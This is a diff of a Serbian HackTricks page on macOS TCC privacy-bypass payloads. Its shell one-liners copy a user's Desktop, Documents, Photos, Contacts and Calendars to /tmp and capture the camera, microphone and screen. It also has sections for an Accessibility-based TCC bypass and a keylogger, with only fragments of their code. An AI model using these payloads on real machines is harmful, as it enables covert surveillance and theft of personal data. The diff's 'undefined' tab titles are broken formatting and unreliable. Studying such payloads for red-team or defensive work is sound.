@@ -1,4 +1,4 @@
-# macOS TCC Payloadi
+# macOS TCC Payloads
 
 <details>
 
@@ -9,7 +9,7 @@ Drugi načini podrške HackTricks-u:
 * Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
@@ -22,6 +22,7 @@ Drugi načini podrške HackTricks-u:
 {% tabs %}
 {% tab title="ObjetiveC" %}
 Kopiraj `$HOME/Desktop` u `/tmp/desktop`.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -57,6 +58,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Kopiraj `$HOME/Desktop` u `/tmp/desktop`.
+
 ```bash
 cp -r "$HOME/Desktop" "/tmp/desktop"
 ```
@@ -69,8 +71,11 @@ cp -r "$HOME/Desktop" "/tmp/desktop"
 * **TCC**: `kTCCServiceSystemPolicyDocumentsFolder`
 
 {% tabs %}
-{% tab title="ObjetiveC" %}
+{% tab title="undefined" %}
 Kopiraj `$HOME/Documents` u `/tmp/documents`.
+{% endtab %}
+
+{% tab title="undefined" %}
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -102,8 +107,11 @@ NSLog(@"Copy completed successfully.", error);
 fclose(stderr); // Close the file stream
 }
 ```
+{% endtab %}
+
 {% tab title="Shell" %}
 Kopiraj `$HOME/`Documents u `/tmp/documents`.
+
 ```bash
 cp -r "$HOME/Documents" "/tmp/documents"
 ```
@@ -118,6 +126,7 @@ cp -r "$HOME/Documents" "/tmp/documents"
 {% tabs %}
 {% tab title="ObjetiveC" %}
 Kopiraj `$HOME/Downloads` u `/tmp/downloads`.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -153,6 +162,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Kopiraj `$HOME/Dowloads` u `/tmp/downloads`.
+
 ```bash
 cp -r "$HOME/Downloads" "/tmp/downloads"
 ```
@@ -167,6 +177,7 @@ cp -r "$HOME/Downloads" "/tmp/downloads"
 {% tabs %}
 {% tab title="ObjetiveC" %}
 Kopiraj `$HOME/Pictures/Photos Library.photoslibrary` u `/tmp/photos`.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -202,6 +213,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Kopiraj `$HOME/Pictures/Photos Library.photoslibrary` u `/tmp/photos`.
+
 ```bash
 cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 ```
@@ -216,6 +228,7 @@ cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 {% tabs %}
 {% tab title="ObjetiveC" %}
 Kopiraj `$HOME/Library/Application Support/AddressBook` u `/tmp/contacts`.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -251,6 +264,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Kopiraj `$HOME/Library/Application Support/AddressBook` u `/tmp/contacts`.
+
 ```bash
 cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 ```
@@ -265,6 +279,7 @@ cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 {% tabs %}
 {% tab title="ObjectiveC" %}
 Kopiraj `$HOME/Library/Calendars` u `/tmp/calendars`.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -300,12 +315,15 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Kopiraj `$HOME/Library/Calendars` u `/tmp/calendars`.
+
 ```bash
 cp -r "$HOME/Library/Calendars" "/tmp/calendars"
 ```
+
 {% tabs %}
 {% tab title="ObjetiveC - Snimanje" %}
 Snimi 3 sekunde dug video i sačuvaj ga u **`/tmp/recording.mov`**
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -385,6 +403,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="ObjectiveC - Provera" %}
 Proverite da li program ima pristup kameri.
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -418,20 +437,24 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Napravite fotografiju kamerom
+
 ```bash
 ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 ```
 {% endtab %}
 {% endtabs %}
 
-### Mikrofon
+#### Mikrofon
 
 * **Ovlašćenje**: **com.apple.security.device.audio-input**
 * **TCC**: `kTCCServiceMicrophone`
 
 {% tabs %}
-{% tab title="ObjetiveC - Snimanje" %}
+{% tab title="undefined" %}
 Snimi 5 sekundi zvuka i sačuvaj ga u `/tmp/recording.m4a`
+{% endtab %}
+
+{% tab title="undefined" %}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -528,8 +551,11 @@ AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];
 fclose(stderr); // Close the file stream
 }
 ```
+{% endtab %}
+
 {% tab title="ObjectiveC - Provera" %}
 Proverite da li aplikacija ima pristup mikrofonu.
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -561,6 +587,7 @@ static void telegram(int argc, const char **argv) {
 
 {% tab title="Shell" %}
 Snimi 5s audio i sačuvaj ga u `/tmp/recording.wav`
+
 ```bash
 # Check the microphones
 ffmpeg -f avfoundation -list_devices true -i ""
@@ -570,7 +597,7 @@ ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
 {% endtab %}
 {% endtabs %}
 
-### Lokacija
+#### Lokacija
 
 {% hint style="success" %}
 Da bi aplikacija dobila lokaciju, **Usluge lokacije** (iz sekcije Privatnost i Sigurnost) **mora biti omogućeno,** inače neće biti u mogućnosti pristupiti joj.
@@ -582,6 +609,7 @@ Da bi aplikacija dobila lokaciju, **Usluge lokacije** (iz sekcije Privatnost i S
 {% tabs %}
 {% tab title="ObjectiveC" %}
 Zapiši lokaciju u `/tmp/logs.txt`
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -632,13 +660,14 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 
 {% tab title="Shell" %}
 Dobijte pristup lokaciji
+
 ```
 ???
 ```
 {% endtab %}
 {% endtabs %}
 
-### Snimanje ekrana
+#### Snimanje ekrana
 
 * **Ovlašćenje**: Nijedno
 * **TCC**: `kTCCServiceScreenCapture`
@@ -646,6 +675,7 @@ Dobijte pristup lokaciji
 {% tabs %}
 {% tab title="ObjectiveC" %}
 Snimite glavni ekran 5 sekundi u `/tmp/screen.mov`
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -703,18 +733,20 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 
 {% tab title="Shell" %}
 Snimi glavni ekran 5 sekundi
+
 ```bash
 screencapture -V 5 /tmp/screen.mov
 ```
 {% endtab %}
 {% endtabs %}
 
-### Pristupačnost
+#### Pristupačnost
 
 * **Ovlašćenje**: Nijedno
 * **TCC**: `kTCCServiceAccessibility`
 
 Koristite TCC privilegiju da prihvatite kontrolu nad Finderom pritiskom na enter i na taj način zaobiđete TCC.
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -769,6 +801,7 @@ return 0;
 
 {% tab title="Keylogger" %}
 Skladišti pritisnute tastere u **`/tmp/keystrokes.txt`**
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -888,7 +921,7 @@ Drugi načini podrške HackTricks-u:
 * Ako želite da vidite **vašu kompaniju oglašenu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
